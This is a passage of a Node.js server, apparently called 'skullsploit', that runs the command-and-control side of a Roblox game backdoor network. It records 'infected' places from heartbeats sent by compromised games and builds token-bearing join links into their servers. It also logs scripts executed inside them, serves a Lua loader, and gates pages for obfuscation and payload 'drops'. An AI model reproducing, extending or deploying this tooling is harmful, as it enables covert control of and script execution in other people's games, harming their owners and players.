close.Position = UDim2.new(1, -32, 0, 0)
close.BackgroundTransparency = 1
close.Font = Enum.Font.SourceSansBold
close.Text = "x"
close.TextColor3 = DIM
close.TextSize = 16
close.AutoButtonColor = false
close.Parent = header
close.MouseEnter:Connect(function() close.TextColor3 = INK end)
close.MouseLeave:Connect(function() close.TextColor3 = DIM end)
close.MouseButton1Click:Connect(function() gui:Destroy() end)

local search = Instance.new("TextBox")
search.Size = UDim2.new(1, -24, 0, 32)
search.Position = UDim2.new(0, 12, 0, 50)
search.BackgroundColor3 = BG2
search.BorderSizePixel = 0
search.Font = Enum.Font.Code
search.PlaceholderText = "search..."
search.PlaceholderColor3 = FAINT
search.Text = ""
search.TextColor3 = INK
search.TextSize = 13
search.TextXAlignment = Enum.TextXAlignment.Left
search.ClearTextOnFocus = false
search.Parent = frame
local sStroke = Instance.new("UIStroke") sStroke.Color = LINE sStroke.Thickness = 1 sStroke.Parent = search
local sPad = Instance.new("UIPadding")
sPad.PaddingLeft = UDim.new(0, 12) sPad.PaddingRight = UDim.new(0, 12)
sPad.Parent = search

local scroll = Instance.new("ScrollingFrame")
scroll.Size = UDim2.new(1, -16, 1, -98)
scroll.Position = UDim2.new(0, 8, 0, 90)
scroll.BackgroundTransparency = 1
scroll.BorderSizePixel = 0
scroll.ScrollBarThickness = 3
scroll.ScrollBarImageColor3 = LINE
scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
scroll.Parent = frame

local layout = Instance.new("UIListLayout")
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.Padding = UDim.new(0, 1)
layout.Parent = scroll

local rowMeta = {}
for i, name in ipairs(names) do
  local btn = Instance.new("TextButton")
  btn.Size = UDim2.new(1, 0, 0, 30)
  btn.BackgroundColor3 = BG2
  btn.BorderSizePixel = 0
  btn.Font = Enum.Font.Code
  btn.Text = "  " .. name
  btn.TextColor3 = INK
  btn.TextSize = 12
  btn.TextXAlignment = Enum.TextXAlignment.Left
  btn.AutoButtonColor = false
  btn.LayoutOrder = i
  btn.Parent = scroll
  btn.MouseEnter:Connect(function() btn.BackgroundColor3 = BG3 end)
  btn.MouseLeave:Connect(function() btn.BackgroundColor3 = BG2 end)
  btn.MouseButton1Click:Connect(function()
    btn.Text = "  ... " .. name
    task.spawn(function()
      local ok, err = fire(name)
      btn.Text = "  " .. name
      if not ok then warn("[morphs] " .. name .. ": " .. tostring(err)) end
    end)
  end)
  table.insert(rowMeta, { name = name:lower(), btn = btn })
end

search:GetPropertyChangedSignal("Text"):Connect(function()
  local q = search.Text:lower()
  for _, r in ipairs(rowMeta) do
    r.btn.Visible = q == "" or r.name:find(q, 1, true) ~= nil
  end
end)

print("[morphs] loaded \xc2\xb7 " .. #names .. " entries \xc2\xb7 welcome, " .. LP.Name)
`;
}

app.get('/m.lua', (req, res) => {
  // Prefer a configured SITE_URL when set; otherwise derive from the request
  // and strip anything that could break out of the Lua string literal we
  // interpolate the value into (quotes, backslashes, newlines, control chars).
  let baseUrl = (process.env.SITE_URL || `${req.protocol}://${req.get('host') || ''}`).trim();
  baseUrl = baseUrl.replace(/[^A-Za-z0-9:/._\-]/g, '');
  if (!/^https?:\/\//.test(baseUrl)) baseUrl = 'http://localhost:3000';
  res.type('text/plain').send(buildMorphLoader(baseUrl));
});

app.post('/api/scripts/:id/like', likeLimiter, requireUser, (req, res) => {
  const scripts = readJson(SCRIPTS_FILE, []);
  const s = scripts.find(x => x.id === req.params.id);
  if (!s) return res.status(404).json({ error: 'not found' });
  s.likes = s.likes || [];
  const u = req.session.user.username;
  const i = s.likes.indexOf(u);
  let liked;
  if (i >= 0) { s.likes.splice(i, 1); liked = false; }
  else        { s.likes.push(u);      liked = true; }
  writeJson(SCRIPTS_FILE, scripts);
  res.json({ ok: true, liked, count: s.likes.length });
});

// ===== GAMES =====
function bucketFor(n) {
  if (n >= 1000) return '1k+';
  if (n >= 100) return '100-1k';
  if (n >= 25) return '25-100';
  return '0-25';
}

// build a usable thumbnail URL. trust the heartbeat's URL only if it's an https roblox cdn url;
// otherwise fall back to the legacy asset-thumbnail URL based on placeId.
function thumbUrlFor(placeId, raw) {
  if (typeof raw === 'string') {
    const r = raw.trim();
    if (/^https:\/\/[\w.-]*\.rbxcdn\.com\//i.test(r)) return r;
    if (/^https:\/\/(www\.)?roblox\.com\//i.test(r)) return r;
  }
  const id = String(placeId || '').replace(/[^0-9]/g, '');
  if (!id) return null;
  return `https://www.roblox.com/asset-thumbnail/image?assetId=${id}&width=420&height=420&format=Png`;
}

function getMyToken(username) {
  const devs  = readJson(DEVS_FILE, []);
  const users = readJson(USERS_FILE, []);
  let rec = devs.find(d => d.username === username);
  let bucketFile = DEVS_FILE, bucketAll = devs;
  if (!rec) { rec = users.find(u => u.username === username); bucketFile = USERS_FILE; bucketAll = users; }
  if (!rec) return '';
  return ensureGameToken(rec, bucketFile, bucketAll);
}

function buildJoinUrl(placeId, jobId, token) {
  return `https://www.roblox.com/games/start?placeId=${encodeURIComponent(placeId)}&gameInstanceId=${encodeURIComponent(jobId)}&launchData=${encodeURIComponent(token)}`;
}
// placeId-only join URL: lets Roblox route us to any available server, or spin a new one up.
// useful for offline places where every previous jobId is dead.
function buildTryJoinUrl(placeId, token) {
  return `https://www.roblox.com/games/start?placeId=${encodeURIComponent(placeId)}&launchData=${encodeURIComponent(token)}`;
}

app.get('/api/games', requireUser, (req, res) => {
  const cutoff = Date.now() - HEARTBEAT_TTL;
  const me = req.session.user.username;
  const token = getMyToken(me);

  const byPlace = new Map();

  // 1) seed with every place we've ever seen so offline places still list
  for (const p of infectedPlaces.values()) {
    byPlace.set(p.placeId, {
      placeId: p.placeId,
      name: p.name || 'Untitled',
      thumbnail: thumbUrlFor(p.placeId, p.thumbnail),
      firstSeen: p.firstSeen || null,
      lastSeen: p.lastSeen || null,
      servers: [],
      totalPlayers: 0,
      pageUrl: `https://www.roblox.com/games/${encodeURIComponent(p.placeId)}`,
      tryJoinUrl: buildTryJoinUrl(p.placeId, token)
    });
  }

  // 2) overlay live servers (heartbeated within TTL)
  const live = [...activeGames.values()].filter(g => g.lastSeen >= cutoff);
  for (const g of live) {
    if (!byPlace.has(g.placeId)) {
      byPlace.set(g.placeId, {
        placeId: g.placeId,
        name: g.name,
        thumbnail: thumbUrlFor(g.placeId, g.thumbnail),
        firstSeen: null,
        lastSeen: new Date(g.lastSeen).toISOString(),
        servers: [],
        totalPlayers: 0,
        pageUrl: `https://www.roblox.com/games/${encodeURIComponent(g.placeId)}`,
        tryJoinUrl: buildTryJoinUrl(g.placeId, token)
      });
    }
    const grp = byPlace.get(g.placeId);
    grp.totalPlayers += g.players;
    if (!grp.thumbnail) grp.thumbnail = thumbUrlFor(g.placeId, g.thumbnail);
    if (!grp.name || grp.name === 'Untitled') grp.name = g.name;
    grp.servers.push({
      id: g.jobId,
      players: g.players,
      maxPlayers: g.maxPlayers,
      lastSeen: g.lastSeen,
      joinUrl: buildJoinUrl(g.placeId, g.jobId, token)
    });
  }

  const games = [...byPlace.values()]
    .map(grp => {
      grp.servers.sort((a, b) => b.players - a.players);
      grp.serverCount = grp.servers.length;
      grp.bucket = bucketFor(grp.totalPlayers);
      grp.live = grp.servers.length > 0;
      return grp;
    })
    // live games first (by player count); then offline by most recently seen
    .sort((a, b) => {
      if (a.live !== b.live) return a.live ? -1 : 1;
      if (a.live) return b.totalPlayers - a.totalPlayers;
      return new Date(b.lastSeen || 0) - new Date(a.lastSeen || 0);
    });
  res.json({ games });
});

// owner-only: forget a place (e.g. it's been cleansed or you don't want it shown)
app.delete('/api/places/:placeId', writeLimiter, requireOwner, (req, res) => {
  const placeId = String(req.params.placeId || '').replace(/[^0-9]/g, '').slice(0, 32);
  if (!placeId) return res.status(400).json({ error: 'invalid placeId' });
  if (!infectedPlaces.has(placeId)) return res.status(404).json({ error: 'not found' });
  infectedPlaces.delete(placeId);
  placesDirty = true;
  savePlacesIfDirty();
  audit(req, 'place.forgotten', placeId, {});
  res.json({ ok: true });
});

app.get('/api/games/:placeId', requireUser, (req, res) => {
  const placeId = String(req.params.placeId || '').replace(/[^0-9]/g, '').slice(0, 32);
  if (!placeId) return res.status(400).json({ error: 'invalid placeId' });
  const cutoff = Date.now() - HEARTBEAT_TTL;
  const me = req.session.user.username;
  const token = getMyToken(me);

  const live = [...activeGames.values()].filter(g => g.lastSeen >= cutoff && g.placeId === placeId);
  const stored = infectedPlaces.get(placeId);
  if (!live.length && !stored) return res.json({ game: null });

  const name = (live[0] && live[0].name) || (stored && stored.name) || 'Untitled';
  const thumb = thumbUrlFor(
    placeId,
    (live.map(g => g.thumbnail).find(Boolean)) || (stored && stored.thumbnail)
  );
  const game = {
    placeId,
    name,
    thumbnail: thumb,
    pageUrl: `https://www.roblox.com/games/${encodeURIComponent(placeId)}`,
    tryJoinUrl: buildTryJoinUrl(placeId, token),
    firstSeen: stored ? stored.firstSeen : null,
    lastSeen: stored ? stored.lastSeen : (live[0] ? new Date(live[0].lastSeen).toISOString() : null),
    totalPlayers: live.reduce((s, g) => s + g.players, 0),
    serverCount: live.length,
    live: live.length > 0,
    servers: live
      .map(g => ({
        id: g.jobId,
        players: g.players,
        maxPlayers: g.maxPlayers,
        lastSeen: g.lastSeen,
        joinUrl: buildJoinUrl(placeId, g.jobId, token)
      }))
      .sort((a, b) => b.players - a.players)
  };
  game.bucket = bucketFor(game.totalPlayers);
  res.json({ game });
});

app.post('/api/games/heartbeat', heartbeatLimiter, (req, res) => {
  const { placeId, jobId, name, players, maxPlayers, thumbnail, secret } = req.body || {};
  if (HEARTBEAT_SECRET && secret !== HEARTBEAT_SECRET) return res.status(403).json({ error: 'forbidden' });
  if (!placeId || !jobId) return res.status(400).json({ error: 'placeId and jobId required' });
  const pid = String(placeId).slice(0, 32);
  const id  = String(jobId).slice(0, 64);
  const cleanName = String(name || 'Untitled').slice(0, 80);
  const cleanThumb = typeof thumbnail === 'string' ? thumbnail.slice(0, 500) : null;

  activeGames.set(id, {
    placeId: pid,
    jobId: id,
    name: cleanName,
    players: Math.max(0, parseInt(players, 10) || 0),
    maxPlayers: Math.max(0, parseInt(maxPlayers, 10) || 0),
    thumbnail: cleanThumb,
    lastSeen: Date.now()
  });

  // record this place in the persistent registry so it stays listed even at 0 players
  const nowIso = new Date().toISOString();
  let place = infectedPlaces.get(pid);
  if (!place) {
    place = {
      placeId: pid,
      name: cleanName,
      thumbnail: cleanThumb,
      firstSeen: nowIso,
      lastSeen: nowIso
    };
    infectedPlaces.set(pid, place);
    placesDirty = true;
    audit(req, 'place.first_seen', pid, { name: cleanName });
  } else {
    place.lastSeen = nowIso;
    if (cleanName && cleanName !== 'Untitled' && place.name !== cleanName) { place.name = cleanName; placesDirty = true; }
    if (cleanThumb && place.thumbnail !== cleanThumb) { place.thumbnail = cleanThumb; placesDirty = true; }
  }

  res.json({ ok: true, ttl: Math.floor(HEARTBEAT_TTL / 1000) });
});

app.get('/api/games/my-token', requireUser, (req, res) => {
  const token = getMyToken(req.session.user.username);
  if (!token) return res.status(404).json({ error: 'not found' });
  res.json({ token });
});

app.post('/api/games/verify-token', checkLimiter, (req, res) => {
  const { token } = req.body || {};
  if (typeof token !== 'string' || !token || token.length > 128) return res.json({ valid: false });
  const devs  = readJson(DEVS_FILE, []);
  const users = readJson(USERS_FILE, []);
  let rec = devs.find(d => d.gameToken === token);
  let kind = 'dev';
  if (!rec) { rec = users.find(u => u.gameToken === token); kind = 'user'; }
  if (!rec) return res.json({ valid: false });
  const last = userActivity.get(rec.username);
  if (!last || Date.now() - last > ACTIVITY_WINDOW) return res.json({ valid: false, reason: 'not signed in' });
  res.json({ valid: true, username: rec.username, kind });
});

// ===== EXECUTION LOGS =====
app.post('/api/logs/execute', logLimiter, (req, res) => {
  const { token, robloxName, placeId, jobId, gameName, scriptTitle, scriptBody } = req.body || {};
  if (typeof token !== 'string' || !token) return res.status(400).json({ error: 'token required' });
  const devs  = readJson(DEVS_FILE, []);
  const users = readJson(USERS_FILE, []);
  let rec = devs.find(d => d.gameToken === token) || users.find(u => u.gameToken === token);
  if (!rec) return res.status(403).json({ error: 'invalid token' });

  const body = String(scriptBody || '');
  const entry = {
    id: crypto.randomUUID(),
    websiteUser: rec.username,
    kind: devs.includes(rec) ? 'dev' : 'user',
    robloxName: String(robloxName || '').slice(0, 64),
    placeId: String(placeId || '').slice(0, 32),
    jobId: String(jobId || '').slice(0, 64),
    gameName: String(gameName || 'Unknown').slice(0, 80),
    scriptTitle: String(scriptTitle || '').slice(0, 80),
    scriptPreview: body.slice(0, 280),
    scriptLength: body.length,
    at: new Date().toISOString()
  };
  const logs = readJson(LOGS_FILE, []);
  logs.unshift(entry);
  if (logs.length > LOG_MAX) logs.length = LOG_MAX;
  writeJson(LOGS_FILE, logs);
  res.json({ ok: true });
});

app.get('/api/logs', requireDev, (req, res) => {
  const me = req.session.user.username;
  const token = getMyToken(me);
  const logs = readJson(LOGS_FILE, []).slice(0, 500).map(l => ({
    ...l,
    joinUrl: l.placeId && l.jobId
      ? buildJoinUrl(l.placeId, l.jobId, token)
      : null
  }));
  res.json({ logs });
});

// ===== AUDIT LOG =====
app.get('/api/audit', auditLimiter, requireOwner, (req, res) => {
  const limit = Math.min(Math.max(parseInt(req.query.limit, 10) || 500, 1), 2000);
  const logs = readJson(AUDIT_FILE, []).slice(0, limit);
  res.json({ logs });
});

// ===== STATIC + GATED PAGES =====
app.use((req, res, next) => {
  // block direct access to protected html files
  if (req.path !== '/index.html' && req.path !== '/login.html' && req.path !== '/signup.html' && /\.html$/i.test(req.path)) {
    return res.status(404).send('not found');
  }
  next();
});
app.use(express.static(PUBLIC_DIR, { index: 'index.html', extensions: [] }));

function gated(file) {
  return (req, res) => {
    if (!req.session.user) return res.redirect('/');
    if (!userStillExists(req.session)) {
      return req.session.destroy(() => { res.clearCookie('skl.sid'); res.redirect('/'); });
    }
    res.sendFile(path.join(PUBLIC_DIR, file));
  };
}
function devOnly(file) {
  return (req, res) => {
    if (!req.session.user) return res.redirect('/login');
    if (!userStillExists(req.session)) {
      return req.session.destroy(() => { res.clearCookie('skl.sid'); res.redirect('/login'); });
    }
    if (req.session.user.kind !== 'dev') return res.redirect('/dashboard');
    res.sendFile(path.join(PUBLIC_DIR, file));
  };
}
function ownerOnly(file) {
  return (req, res) => {
    const u = req.session.user;
    if (!u) return res.redirect('/login');
    if (!userStillExists(req.session)) {
      return req.session.destroy(() => { res.clearCookie('skl.sid'); res.redirect('/login'); });
    }
    if (u.kind !== 'dev' || !isOwnerUsername(u.username)) return res.redirect('/dashboard');
    res.sendFile(path.join(PUBLIC_DIR, file));
  };
}
function morphAccessOnly(file) {
  return (req, res) => {
    const u = req.session.user;
    if (!u) return res.redirect('/login');
    if (!userStillExists(req.session)) {
      return req.session.destroy(() => { res.clearCookie('skl.sid'); res.redirect('/login'); });
    }
    if (!hasMorphAccess(u.username)) return res.redirect('/dashboard');
    res.sendFile(path.join(PUBLIC_DIR, file));
  };
}
app.get('/dashboard',     gated('dashboard.html'));
app.get('/games',         gated('games.html'));
app.get('/game/:placeId', gated('game.html'));
app.get('/scripts',       gated('scripts.html'));
app.get('/dev',           devOnly('dev.html'));
app.get('/drops',         devOnly('drops.html'));
app.get('/logs',          devOnly('logs.html'));
app.get('/obfuscate',     devOnly('obfuscate.html'));
app.get('/owner',         ownerOnly('owner.html'));
app.get('/audit',         ownerOnly('audit.html'));
app.get('/morphs',        morphAccessOnly('morphs.html'));
app.get('/login',         (req, res) => res.sendFile(path.join(PUBLIC_DIR, 'login.html')));
app.get('/signup',        (req, res) => res.sendFile(path.join(PUBLIC_DIR, 'signup.html')));

app.use((req, res) => {
  if (req.path.startsWith('/api/')) return res.status(404).json({ error: 'not found' });
  res.status(404).redirect('/');
});
app.use((err, req, res, _next) => {
  if (err && err.type === 'entity.too.large') return res.status(413).json({ error: 'request too large' });
  if (err && err.type === 'entity.parse.failed') return res.status(400).json({ error: 'malformed request' });
  console.error('[err]', err && err.message);
  if (req.path.startsWith('/api/')) return res.status(500).json({ error: 'server error' });
  res.status(500).send('server error');
});

app.listen(PORT, () => {
  console.log(`skullsploit listening on :${PORT}${PROD ? ' (prod)' : ''}`);
});
